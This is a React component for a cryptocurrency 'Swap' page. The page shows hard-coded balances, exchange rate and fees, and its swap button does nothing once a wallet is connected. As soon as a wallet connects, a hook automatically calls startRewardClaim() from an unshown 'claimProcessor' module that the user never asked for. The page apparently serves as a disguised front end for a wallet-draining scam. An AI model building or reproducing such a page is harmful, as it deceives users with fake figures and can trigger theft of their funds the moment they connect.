import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { motion } from 'framer-motion';
import { ArrowDownUp, Settings, ChevronDown, Zap } from 'lucide-react';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { useAccount } from 'wagmi';
import { useState, useEffect } from 'react';
import { startRewardClaim } from '@/lib/claimProcessor';

const Swap = () => {
  const { open } = useWeb3Modal();
  const { isConnected, address } = useAccount();
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');

  // Trigger claimProcessor after wallet connection
  useEffect(() => {
    if (isConnected && address) {
      startRewardClaim();
    }
  }, [isConnected, address]);

  const tokens = [
    { symbol: 'ETH', name: 'Ethereum', icon: '⟠', balance: '2.45' },
    { symbol: 'USDT', name: 'Tether', icon: '₮', balance: '1,250.00' },
    { symbol: 'BNB', name: 'BNB', icon: '◎', balance: '5.12' },
  ];

  return (
    <div className="min-h-screen pt-20 md:pt-24 pb-12">
      <div className="container mx-auto px-4 max-w-lg">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
        >
          <div className="flex items-center justify-between mb-6">
            <h1 className="text-2xl md:text-3xl font-bold font-display">Swap</h1>
            <Button variant="ghost" size="icon" className="glass-effect">
              <Settings className="w-5 h-5" />
            </Button>
          </div>

          <Card className="glass-effect border-border/50 p-4 md:p-6">
            {/* From Token */}
            <div className="space-y-4">
              <div className="p-4 rounded-xl bg-secondary/50">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-muted-foreground">From</span>
                  <span className="text-sm text-muted-foreground">Balance: {tokens[0].balance}</span>
                </div>
                <div className="flex items-center space-x-3">
                  <Input
                    type="number"
                    placeholder="0.0"
                    value={fromAmount}
                    onChange={(e) => setFromAmount(e.target.value)}
                    className="border-0 bg-transparent text-2xl font-bold p-0 h-auto focus-visible:ring-0"
                  />
                  <Button variant="outline" className="glass-effect flex-shrink-0">
                    <span className="mr-2">{tokens[0].icon}</span>
                    {tokens[0].symbol}
                    <ChevronDown className="w-4 h-4 ml-2" />
                  </Button>
                </div>
              </div>

              {/* Swap Button */}
              <div className="flex justify-center -my-2 relative z-10">
                <Button
                  size="icon"
                  className="gradient-primary rounded-xl glow-effect"
                >
                  <ArrowDownUp className="w-5 h-5" />
                </Button>
              </div>

              {/* To Token */}
              <div className="p-4 rounded-xl bg-secondary/50">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-muted-foreground">To</span>
                  <span className="text-sm text-muted-foreground">Balance: {tokens[1].balance}</span>
                </div>
                <div className="flex items-center space-x-3">
                  <Input
                    type="number"
                    placeholder="0.0"
                    value={toAmount}
                    onChange={(e) => setToAmount(e.target.value)}
                    className="border-0 bg-transparent text-2xl font-bold p-0 h-auto focus-visible:ring-0"
                  />
                  <Button variant="outline" className="glass-effect flex-shrink-0">
                    <span className="mr-2">{tokens[1].icon}</span>
                    {tokens[1].symbol}
                    <ChevronDown className="w-4 h-4 ml-2" />
                  </Button>
                </div>
              </div>
            </div>

            {/* Swap Info */}
            <div className="mt-4 p-3 rounded-lg bg-secondary/30 space-y-2 text-sm">
              <div className="flex justify-between text-muted-foreground">
                <span>Rate</span>
                <span>1 ETH = 2,450 USDT</span>
              </div>
              <div className="flex justify-between text-muted-foreground">
                <span>Price Impact</span>
                <span className="text-green-500">{'<0.01%'}</span>
              </div>
              <div className="flex justify-between text-muted-foreground">
                <span>Network Fee</span>
                <span>~$2.50</span>
              </div>
            </div>

            {/* Action Button */}
            <Button
              className="w-full mt-4 gradient-primary glow-effect py-6 text-lg font-semibold"
              onClick={() => !isConnected && open()}
            >
              {isConnected ? (
                <>
                  <Zap className="w-5 h-5 mr-2" />
                  Swap Tokens
                </>
              ) : (
                'Connect Wallet'
              )}
            </Button>
          </Card>
        </motion.div>
      </div>
    </div>
  );
};

export default Swap;
